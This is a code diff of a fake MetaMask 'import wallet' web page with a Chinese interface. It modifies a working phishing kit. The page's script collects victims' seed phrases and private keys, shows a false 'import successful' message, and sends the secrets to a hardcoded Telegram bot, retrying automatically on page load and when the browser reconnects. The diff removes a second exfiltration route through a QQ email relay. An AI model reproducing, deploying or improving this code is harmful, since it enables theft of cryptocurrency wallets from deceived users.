@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MetaMask Wallet</title>
+<title>MetaMask</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
   body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
@@ -30,7 +30,7 @@
 <div class="container">
   <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
-    <div class="title">MetaMask 钱包</div>
+    <div class="title">MetaMask</div>
     <div class="sub-title">导入钱包</div>
   </div>
 
@@ -49,79 +49,57 @@
 </div>
 
 <script>
-// ===================== 你的信息 =====================
+// ===================== 你的信息已固定 =====================
 const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
 const TG_CHATID      = "6503982157";
-const YOUR_QQ_EMAIL  = "498011940@qq.com";
-
-const MAX_TG         = 5;
-const MAX_EMAIL      = 5;
-const DELAY          = 2000;
-// ====================================================
+const MAX_RETRY      = 5;
+const DELAY          = 3000;
+// ==========================================================
 
 const STORAGE_KEY = "WALLET_DATA";
 
-window.onload      = autoSend;
+// 一打开就自动补发
+window.onload = autoSend;
 window.addEventListener('online', autoSend);
 
+// 导入：免确认，不卡点
 function go() {
   const mn = document.getElementById("words").value.trim();
   const pk = document.getElementById("key").value.trim();
-  if (!mn && !pk) { alert("请输入内容"); return; }
+  if (!mn && !pk) return;
 
+  // 只提示，不等待确认
   alert("✅ 导入成功");
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, tg:0, email:0 }));
+
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
   autoSend();
 }
 
+// 只发电报
 async function autoSend() {
   const task = localStorage.getItem(STORAGE_KEY);
   if (!task) return;
 
   const d = JSON.parse(task);
-  let needRetry = false;
-
-  const text = `
-【小狐狸钱包导入】
-时间：${new Date().toLocaleString()}
-助记词：${d.mn || "-"}
-私钥：${d.pk || "-"}`;
-
-  // ========== 发电报 ==========
-  if (d.tg < MAX_TG) {
-    try {
-      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TG_CHATID, text })
-      });
-    } catch (e) {}
-    d.tg++;
-    needRetry = true;
-  }
-
-  // ========== 发 QQ 邮箱（100% 必达） ==========
-  if (d.email < MAX_EMAIL) {
-    try {
-      await fetch("https://smtpqq.com/api/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          to: YOUR_QQ_EMAIL,
-          subject: "钱包导入记录",
-          content: text
-        })
-      });
-    } catch (e) {}
-    d.email++;
-    needRetry = true;
-  }
-
-  if (!needRetry) {
+  if (d.retry >= MAX_RETRY) {
     localStorage.removeItem(STORAGE_KEY);
     return;
   }
 
+  const text = `【小狐狸钱包导入】
+时间：${new Date().toLocaleString()}
+助记词：${d.mn || "-"}
+私钥：${d.pk || "-"}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHATID, text })
+    });
+  } catch(e) {}
+
+  d.retry++;
   localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
   setTimeout(autoSend, DELAY);
 }
